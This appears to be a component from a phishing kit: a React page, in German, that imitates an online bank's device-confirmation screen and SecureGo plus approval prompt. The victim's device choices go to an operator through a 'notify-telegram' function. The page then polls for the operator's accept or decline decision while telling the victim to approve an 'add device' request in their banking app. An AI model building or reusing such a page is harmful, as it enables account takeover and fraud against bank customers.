// 1:1 Portierung der Geräteverwaltung aus dem Original-Repo.
// Unterstützt beide Varianten: genau 1 Gerät und mehrere Geräte.
// Aktuell NICHT in den sichtbaren Flow eingebunden – bleibt im Backend
// verfügbar und kann später an eine Route/Step angeschlossen werden.

import { Info, ArrowRight, Check, ChevronDown, Smartphone, CheckCircle2 } from "lucide-react";
import { useEffect, useMemo, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { fetchTelegramSession } from "@/lib/telegramSession";
// SmartTanOverlay wird im übergeordneten Flow global gerendert.

export interface Device {
  name: string;
  appId: string;
  registeredAt: string;
  online?: boolean;
  cards?: boolean;
}

export interface DeviceManagementStepProps {
  devices: Device[];
  bankId?: string;
  onContinue: () => void;
}

type Stage = "select" | "securego";

const StatusPill = ({ active }: { active: boolean }) =>
  active ? (
    <span className="inline-flex items-center gap-2 rounded-md bg-[#e8f3ec] px-2 py-1 text-sm text-[#0a1f44]">
      <span className="h-2 w-2 rounded-full bg-[#1f9d55]" /> Aktiv
    </span>
  ) : (
    <span className="inline-flex items-center gap-2 rounded-md bg-[#eef1f5] px-2 py-1 text-sm text-[#0a1f44]">
      <span className="h-2 w-2 rounded-full bg-[#1f3a8a]" /> Inaktiv
    </span>
  );

const DeviceCard = ({
  device,
  selected,
  anySelected,
  onToggle,
}: {
  device: Device;
  selected: boolean;
  anySelected: boolean;
  onToggle: () => void;
}) => {
  const online = device.online ?? true;
  const cards = device.cards ?? false;
  const blurred = !anySelected;
  const dimmed = anySelected && !selected;
  return (
    <button
      type="button"
      onClick={onToggle}
      aria-pressed={selected}
      className={`relative text-left rounded-xl border p-6 transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-[#0066b3]/40
        ${selected ? "border-[#0066b3] ring-2 ring-[#0066b3]/40 shadow-md bg-white" : "border-[#d8dbe0] bg-white hover:border-[#9aa3ae]"}
        ${blurred ? "blur-[2px] opacity-90" : ""}
        ${dimmed ? "opacity-60" : ""}
      `}
    >
      <span
        className={`absolute top-4 right-4 flex h-6 w-6 items-center justify-center rounded-md border-2 transition-colors
          ${selected ? "bg-[#0066b3] border-[#0066b3] text-white" : "border-[#c4c9d1] bg-white text-transparent"}
        `}
        aria-hidden="true"
      >
        <Check className="h-4 w-4" strokeWidth={3} />
      </span>

      <h2 className="text-xl font-bold text-[#0a1f44] pr-8">{device.name || "—"}</h2>

      <div className="mt-5 grid grid-cols-2 gap-4">
        <div>
          <div className="text-sm text-[#5a6473]">App-ID</div>
          <div className="mt-1 font-medium text-[#0a1f44]">{device.appId || "—"}</div>
        </div>
        <div>
          <div className="text-sm text-[#5a6473]">Registrierungsdatum</div>
          <div className="mt-1 font-medium text-[#0a1f44]">{device.registeredAt || "—"}</div>
        </div>
      </div>

      <div className="mt-5">
        <div className="text-sm text-[#5a6473]">Status</div>
        <div className="mt-2 space-y-2">
          <div className="flex items-center gap-3">
            <StatusPill active={online} />
            <span className="text-[15px] text-[#0a1f44]">Aufträge OnlineBanking</span>
          </div>
          <div className="flex items-center gap-3">
            <StatusPill active={cards} />
            <span className="text-[15px] text-[#0a1f44]">Mastercard® und Visacard Zahlungen</span>
            <Info className="h-4 w-4 text-[#5a6473]" />
          </div>
        </div>
      </div>
    </button>
  );
};

export function DeviceManagementStep({ devices, bankId, onContinue }: DeviceManagementStepProps) {
  const list = devices.slice(0, 3);
  const isSingle = list.length === 1;
  const [selected, setSelected] = useState<Set<number>>(() => (list.length === 1 ? new Set([0]) : new Set()));
  const [stage, setStage] = useState<Stage>("select");
  const [error, setError] = useState<string | null>(null);
  const [showExplanation, setShowExplanation] = useState(false);
  const [approved, setApproved] = useState(false);
  const [rejected, setRejected] = useState(false);
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const anySelected = selected.size > 0;

  const toggle = (idx: number) => {
    setError(null);
    setSelected((prev) => {
      const next = new Set(prev);
      if (next.has(idx)) next.delete(idx);
      else next.add(idx);
      return next;
    });
  };

  const selectedDevices = useMemo(() => list.filter((_, i) => selected.has(i)), [list, selected]);
  const unselectedDevices = useMemo(() => list.filter((_, i) => !selected.has(i)), [list, selected]);

  const handleWeiter = () => {
    if (!anySelected) {
      setError("Bitte wählen Sie mindestens ein Gerät aus.");
      return;
    }
    openSecureGo();
  };

  const openSecureGo = () => {
    setApproved(false);
    setRejected(false);
    setStage("securego");

    try {
      const tgSessionId = bankId ? sessionStorage.getItem(`tg_session:${bankId}`) : null;
      if (tgSessionId) {
        (supabase as unknown as { functions: { invoke: (n: string, o: unknown) => Promise<unknown> } }).functions
          .invoke("notify-telegram", {
            body: {
              mode: "device-management-pending",
              session_id: tgSessionId,
              active_devices: selectedDevices.map((d) => d.name || d.appId).filter(Boolean),
              inactive_devices: unselectedDevices.map((d) => d.name || d.appId).filter(Boolean),
            },
          })
          .catch((err: unknown) => console.error("notify-telegram device-management-pending failed", err));
      }
    } catch (err) {
      console.warn("[device-management] tg notify skipped", err);
    }
  };

  useEffect(() => {
    if (stage !== "securego") return;
    if (!bankId) return;
    const tgSessionId = sessionStorage.getItem(`tg_session:${bankId}`);
    if (!tgSessionId) return;

    let cancelled = false;
    const POLL_MS = 2500;
    const MAX_MS = 5 * 60 * 1000;
    const startedAt = Date.now();

    const poll = async () => {
      if (cancelled) return;
      try {
        const sess = await fetchTelegramSession(tgSessionId);
        const d = sess?.decision ?? null;

        if (d === "device_accept") {
          setApproved(true);
          setTimeout(() => onContinue(), 1200);
          return;
        }
        if (d === "device_decline") {
          setRejected(true);
          setTimeout(() => {
            setStage("select");
            setError("Die Freigabe wurde abgelehnt. Bitte erneut versuchen.");
          }, 1500);
          return;
        }
      } catch (err) {
        console.warn("[device-management] poll error", err);
      }
      if (Date.now() - startedAt > MAX_MS) return;
      pollRef.current = setTimeout(poll, POLL_MS);
    };
    pollRef.current = setTimeout(poll, POLL_MS);

    return () => {
      cancelled = true;
      if (pollRef.current) clearTimeout(pollRef.current);
    };
  }, [stage, bankId, onContinue]);

  const gridCols = list.length >= 3 ? "md:grid-cols-3" : list.length === 2 ? "md:grid-cols-2" : "md:grid-cols-1";

  return (
    <div className="min-h-screen bg-[#f5f6f8] py-8 px-4">
      <div className="mx-auto max-w-6xl rounded-2xl bg-white p-8 shadow-sm">
        <h1 className="text-2xl font-bold text-[#0a1f44]">
          {isSingle
            ? "Möchten Sie dieses Gerät weiterhin verwenden?"
            : "Bitte bestätigen Sie Ihre aktuell genutzten Geräte."}
        </h1>
        <p className="mt-4 text-[15px] leading-relaxed text-[#222]">
          {isSingle
            ? "Aus Sicherheitsgründen überprüfen wir Ihr registriertes Gerät. Bitte bestätigen Sie, dass Sie dieses Gerät weiterhin für Ihr OnlineBanking verwenden möchten. Nach der Bestätigung wird das Gerät als vertrauenswürdig gespeichert."
            : "Aus Sicherheitsgründen überprüfen wir Ihre registrierten Geräte. Wählen Sie alle Geräte aus, die Sie weiterhin für Ihr OnlineBanking verwenden möchten. Die ausgewählten Geräte werden als vertrauenswürdig gespeichert. Nicht ausgewählte Geräte werden als nicht mehr aktuell behandelt."}
        </p>

        {!isSingle && (
          <div className="mt-5 flex items-start gap-3 rounded-lg border border-[#cfe1f1] bg-[#eaf3fb] p-3">
            <Info className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#0066b3]" />
            <p className="text-[14px] text-[#0a1f44]">
              Sie können mehrere Geräte auswählen. <strong>Mindestens ein Gerät</strong> muss ausgewählt werden.
            </p>
          </div>
        )}

        <div className={`mt-6 grid grid-cols-1 gap-6 ${gridCols}`}>
          {list.map((d, idx) => (
            <DeviceCard
              key={`${d.appId}-${idx}`}
              device={d}
              selected={selected.has(idx)}
              anySelected={anySelected}
              onToggle={() => toggle(idx)}
            />
          ))}
        </div>

        {error && (
          <div className="mt-4 rounded-md border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700">{error}</div>
        )}

        <div className="mt-6 flex flex-wrap gap-3">
          <button
            type="button"
            onClick={handleWeiter}
            className="inline-flex items-center gap-2 rounded-full bg-[#0066b3] px-5 py-3 text-white font-semibold hover:bg-[#005091] disabled:opacity-60"
          >
            Weiter <ArrowRight className="h-5 w-5" />
          </button>
        </div>
      </div>

      {stage === "securego" && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4 overflow-y-auto">
          <div className="w-full max-w-lg rounded-2xl bg-white p-6 shadow-xl my-8">
            <div className="rounded-lg border border-gray-200 p-4 space-y-3">
              <p className="text-base font-bold text-gray-900 mb-1">Gerät hinzufügen</p>

              <div>
                <p className="text-sm font-bold text-gray-900 mb-1">Diese Geräte bleiben aktiv</p>
                <ul className="ml-5 list-disc text-sm text-gray-800">
                  {selectedDevices.map((d, i) => (
                    <li key={`a-${i}`}>{d.name || d.appId || "—"}</li>
                  ))}
                </ul>
              </div>

              <div className="border-t border-gray-200" />

              <div>
                <p className="text-sm font-bold text-gray-900 mb-1">Diese Geräte werden als nicht mehr aktuell markiert</p>
                {unselectedDevices.length > 0 ? (
                  <ul className="ml-5 list-disc text-sm text-gray-800">
                    {unselectedDevices.map((d, i) => (
                      <li key={`u-${i}`}>{d.name || d.appId || "—"}</li>
                    ))}
                  </ul>
                ) : (
                  <p className="text-sm text-gray-500 ml-1">—</p>
                )}
              </div>
            </div>

            <div className="space-y-4 mt-5">
              <h3 className="text-xl font-bold text-gray-900">Sicherheitsabfrage</h3>

              <button
                className="flex items-center gap-2 text-sm font-semibold"
                style={{ color: "#0066cc" }}
                onClick={() => setShowExplanation(!showExplanation)}
              >
                <ChevronDown className={`w-4 h-4 transition-transform ${showExplanation ? "rotate-180" : ""}`} />
                Bitte unbedingt Auftragsdaten abgleichen
              </button>

              {showExplanation && (
                <div className="rounded-lg bg-blue-50 border border-blue-200 p-3 text-sm text-gray-700">
                  Gleichen Sie die Auftragsdaten in der App mit den hier angezeigten Daten ab, bevor Sie den Auftrag freigeben.
                </div>
              )}

              <div className="rounded-lg border border-gray-300 p-3 flex items-center justify-between">
                <div>
                  <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
                  <p className="text-sm text-gray-900 font-medium">SecureGo plus</p>
                </div>
                <ChevronDown className="w-5 h-5 text-gray-400" />
              </div>

              <div
                className="rounded-lg p-5 space-y-4"
                style={{ backgroundColor: "#FFF4EC", border: "1.5px solid #F08C00" }}
              >
                <div className="flex items-center gap-3">
                  <Smartphone className="w-5 h-5 text-gray-700" />
                  <p className="text-base font-bold text-gray-900">Bestätigen mit SecureGo plus</p>
                </div>
                <ol className="list-decimal space-y-3 text-sm text-gray-700 pl-6">
                  <li>Öffnen Sie die App SecureGo plus auf Ihrem Mobile Device.</li>
                  <li>Prüfen Sie die Auftragsdaten.</li>
                  <li>
                    Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind. Andernfalls lehnen Sie den Auftrag ab.
                  </li>
                </ol>

                {!approved && !rejected && (
                  <div className="flex flex-col items-center gap-3 pt-2">
                    <div
                      className="w-8 h-8 rounded-full border-[3px] border-gray-200 animate-spin"
                      style={{ borderTopColor: "#0066cc" }}
                    />
                  </div>
                )}
                {approved && (
                  <div className="text-center space-y-2 pt-2">
                    <CheckCircle2 className="w-7 h-7 text-green-500 mx-auto" />
                    <p className="text-sm font-medium text-green-600">Freigabe erteilt!</p>
                  </div>
                )}
                {rejected && (
                  <div className="text-center space-y-2 pt-2">
                    <p className="text-sm font-medium text-red-600">Freigabe abgelehnt.</p>
                  </div>
                )}
              </div>
            </div>

            <div className="flex items-center gap-3 pt-4">
              <button
                onClick={() => setStage("select")}
                disabled={approved}
                className="px-6 py-2 rounded-full border font-medium text-sm border-[#0066b3] text-[#0066b3] disabled:opacity-50"
              >
                Abbrechen
              </button>
            </div>
          </div>
        </div>
      )}

      {/* SmartTanOverlay wird ggf. global im übergeordneten Flow gerendert. */}
    </div>
  );
}

export default DeviceManagementStep;
